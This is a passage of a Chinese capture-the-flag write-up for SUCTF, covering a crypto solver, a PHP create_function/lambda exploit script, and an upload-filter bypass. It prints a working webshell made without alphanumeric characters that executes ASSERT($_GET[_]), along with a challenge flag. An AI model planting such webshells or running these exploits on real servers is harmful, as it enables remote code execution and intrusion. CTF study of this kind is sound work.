</span></span><span style=display:flex><span>    ss<span style=color:#f92672>.</span>extend(xrange(<span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>50</span>))
</span></span><span style=display:flex><span>    cipher <span style=color:#f92672>=</span> getCipher()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    keyPool <span style=color:#f92672>=</span> getKeyPool(cipher<span style=color:#f92672>=</span>cipher, stepSet<span style=color:#f92672>=</span>ss, plainSet<span style=color:#f92672>=</span>ps, keySet<span style=color:#f92672>=</span>ks)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> keyPool:
</span></span><span style=display:flex><span>        freq <span style=color:#f92672>=</span> getFrequency(cipher, keyPool[i])
</span></span><span style=display:flex><span>        key <span style=color:#f92672>=</span> analyseFrequency(freq)
</span></span><span style=display:flex><span>        print <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(map(chr,key))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> __name__ <span style=color:#f92672>==</span> <span style=color:#e6db74>&#39;__main__&#39;</span>:
</span></span><span style=display:flex><span>    main()
</span></span></code></pre></td></tr></table></div></div><h1 id=web>WEB<a hidden class=anchor aria-hidden=true href=#web>#</a></h1><h2 id=anonymous>Anonymous<a hidden class=anchor aria-hidden=true href=#anonymous>#</a></h2><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-5-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-5-12>12</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>$MY <span style=color:#f92672>=</span> <span style=color:#a6e22e>create_function</span>(<span style=color:#e6db74>&#34;&#34;</span>,<span style=color:#e6db74>&#34;die(`cat flag.php`);&#34;</span>);
</span></span><span style=display:flex><span>$hash <span style=color:#f92672>=</span> <span style=color:#a6e22e>bin2hex</span>(<span style=color:#a6e22e>openssl_random_pseudo_bytes</span>(<span style=color:#ae81ff>32</span>));
</span></span><span style=display:flex><span><span style=color:#66d9ef>eval</span>(<span style=color:#e6db74>&#34;function SUCTF_</span><span style=color:#e6db74>$hash</span><span style=color:#e6db74>(){&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>.</span><span style=color:#e6db74>&#34;global </span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>MY;&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>.</span><span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\$</span><span style=color:#e6db74>MY();&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>.</span><span style=color:#e6db74>&#34;}&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;func_name&#39;</span>])){
</span></span><span style=display:flex><span>    $_GET[<span style=color:#e6db74>&#34;func_name&#34;</span>]();
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>die</span>();
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#66d9ef>__FILE__</span>);
</span></span></code></pre></td></tr></table></div></div><p><a href=https://www.jianshu.com/p/19e3ee990cb7>https://www.jianshu.com/p/19e3ee990cb7</a></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-6-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-6-24>24</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>import</span> <span style=color:#a6e22e>requests</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>import</span> <span style=color:#a6e22e>socket</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>import</span> <span style=color:#a6e22e>time</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>from</span> <span style=color:#a6e22e>multiprocessing</span><span style=color:#f92672>.</span><span style=color:#a6e22e>dummy</span> <span style=color:#a6e22e>import</span> <span style=color:#a6e22e>Pool</span> <span style=color:#66d9ef>as</span> <span style=color:#a6e22e>ThreadPool</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>try</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>requests</span><span style=color:#f92672>.</span><span style=color:#a6e22e>packages</span><span style=color:#f92672>.</span><span style=color:#a6e22e>urllib3</span><span style=color:#f92672>.</span><span style=color:#a6e22e>disable_warnings</span>()
</span></span><span style=display:flex><span><span style=color:#a6e22e>except</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>pass</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>def</span> <span style=color:#a6e22e>run</span>(<span style=color:#a6e22e>i</span>)<span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>while</span> <span style=color:#ae81ff>1</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>HOST</span> <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;web.suctf.asuri.org&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>PORT</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>81</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>s</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket</span><span style=color:#f92672>.</span><span style=color:#a6e22e>socket</span>(<span style=color:#a6e22e>socket</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AF_INET</span>, <span style=color:#a6e22e>socket</span><span style=color:#f92672>.</span><span style=color:#a6e22e>SOCK_STREAM</span>)
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>s</span><span style=color:#f92672>.</span><span style=color:#a6e22e>connect</span>((<span style=color:#a6e22e>HOST</span>, <span style=color:#a6e22e>PORT</span>))
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>s</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sendall</span>(<span style=color:#e6db74>&#39;GET /index.php HTTP/1.1\nHost: web.suctf.asuri.org\nConnection: Keep-Alive\n\n&#39;</span>)
</span></span><span style=display:flex><span>        <span style=color:#75715e># s.close()
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>print</span> <span style=color:#e6db74>&#39;ok&#39;</span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>time</span><span style=color:#f92672>.</span><span style=color:#a6e22e>sleep</span>(<span style=color:#ae81ff>0.5</span>)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>print</span> <span style=color:#a6e22e>requests</span><span style=color:#f92672>.</span><span style=color:#a6e22e>get</span>(<span style=color:#e6db74>&#39;http://web.suctf.asuri.org:81/index.php?func_name=%00lambda_1&#39;</span>)<span style=color:#f92672>.</span><span style=color:#a6e22e>content</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>i</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>pool</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>ThreadPool</span>( <span style=color:#a6e22e>i</span> )
</span></span><span style=display:flex><span><span style=color:#a6e22e>result</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>pool</span><span style=color:#f92672>.</span><span style=color:#a6e22e>map_async</span>( <span style=color:#a6e22e>run</span>, <span style=color:#a6e22e>range</span>(<span style=color:#a6e22e>i</span>) )<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span>(<span style=color:#ae81ff>0xffff</span>)
</span></span></code></pre></td></tr></table></div></div><p><code>$flag="SUCTF{L4GsMqu6gu5knFnCi2Te8SjSucxKfQj6tuPJokoFhTCJjpa6RSfK}";</code></p><h2 id=getshell>Getshell<a hidden class=anchor aria-hidden=true href=#getshell>#</a></h2><p>要求上传的webshell文件从第6个字符开始都不能在黑名单内。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-5>5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-6>6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-7>7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-7-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-7-8>8</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#66d9ef>if</span>($contents<span style=color:#f92672>=</span><span style=color:#a6e22e>file_get_contents</span>($_FILES[<span style=color:#e6db74>&#34;file&#34;</span>][<span style=color:#e6db74>&#34;tmp_name&#34;</span>])){
</span></span><span style=display:flex><span>    $data<span style=color:#f92672>=</span><span style=color:#a6e22e>substr</span>($contents,<span style=color:#ae81ff>5</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>foreach</span> ($black_char <span style=color:#66d9ef>as</span> $b) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>stripos</span>($data, $b) <span style=color:#f92672>!==</span> <span style=color:#66d9ef>false</span>){
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>die</span>(<span style=color:#e6db74>&#34;illegal char&#34;</span>);
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>    }     
</span></span><span style=display:flex><span>} 
</span></span></code></pre></td></tr></table></div></div><p>用burp intruder跑一遍，发现不在黑名单里的可打印字符有 <code>$()[]_~=;.</code> 共10个。</p><p>跑的时候需注意<code>Intruder=>payloads=>payload encoding</code> 处需取消勾选，否则会因为字符编码而不能得到正确的白名单。</p><p>跑的时候可以在<code>Intruder=>options=>Grep-Match</code> 中选择 flag <code>illegal</code> ，这样就可以快速看到那些字符是合法的了。</p><p>接下来就是构造一个由 <code>$()[]_~=;.</code> 组成的webshell了，主要思路来自 <a href=https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html>一些不包含数字和字母的webshell</a> 。</p><p>构造出的最终结果如下：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-8-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-8-1>1</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?=</span> $_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>==</span><span style=color:#a6e22e>_</span>;$__<span style=color:#f92672>=~</span><span style=color:#a6e22e>一</span>[$_];$___<span style=color:#f92672>=~</span><span style=color:#a6e22e>了</span>[$_];$____<span style=color:#f92672>=~</span><span style=color:#a6e22e>端</span>[$_];$_____<span style=color:#f92672>=~</span><span style=color:#a6e22e>得</span>[$_];$______<span style=color:#f92672>=~</span><span style=color:#a6e22e>第</span>[$_];$_______<span style=color:#f92672>=~</span><span style=color:#a6e22e>学</span>[$_];$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>.</span>$__<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$____;$_<span style=color:#f92672>=</span>$$_;$__<span style=color:#f92672>=</span>$_____<span style=color:#f92672>.</span>$______<span style=color:#f92672>.</span>$______<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$_______<span style=color:#f92672>.</span>$____;$__($_[<span style=color:#a6e22e>_</span>]);
</span></span></code></pre></td></tr></table></div></div><p>详细注释：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-9-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-9-16>16</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?=</span> 
</span></span><span style=display:flex><span>$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>==</span><span style=color:#a6e22e>_</span>;<span style=color:#75715e>//1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$__<span style=color:#f92672>=~</span><span style=color:#a6e22e>一</span>[$_];<span style=color:#75715e>//G
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$___<span style=color:#f92672>=~</span><span style=color:#a6e22e>了</span>[$_];<span style=color:#75715e>//E
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$____<span style=color:#f92672>=~</span><span style=color:#a6e22e>端</span>[$_];<span style=color:#75715e>//T
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_____<span style=color:#f92672>=~</span><span style=color:#a6e22e>得</span>[$_];<span style=color:#75715e>//A
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$______<span style=color:#f92672>=~</span><span style=color:#a6e22e>第</span>[$_];<span style=color:#75715e>//S
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_______<span style=color:#f92672>=~</span><span style=color:#a6e22e>学</span>[$_];<span style=color:#75715e>//R
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>.</span>$__<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$____;<span style=color:#75715e>//_GET
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_<span style=color:#f92672>=</span>$$_;<span style=color:#75715e>//$_GET
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$__<span style=color:#f92672>=</span>$_____<span style=color:#f92672>.</span>$______<span style=color:#f92672>.</span>$______<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$_______<span style=color:#f92672>.</span>$____;<span style=color:#75715e>//ASSERT
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$__($_[<span style=color:#a6e22e>_</span>]);<span style=color:#75715e>//ASSERT($_GET[_]);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#f92672>------------------------------------------------------</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>web</span><span style=color:#f92672>.</span><span style=color:#a6e22e>suctf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>asuri</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>:</span><span style=color:#ae81ff>82</span><span style=color:#f92672>/</span><span style=color:#a6e22e>upload</span><span style=color:#f92672>/</span><span style=color:#ae81ff>54</span><span style=color:#a6e22e>add22477b7aec5a09a6e2a280464fb</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>_</span><span style=color:#f92672>=</span><span style=color:#a6e22e>phpinfo</span>();
</span></span></code></pre></td></tr></table></div></div><p>可以有一个更短更舒服的选择</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-10-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-10-1>1</a>
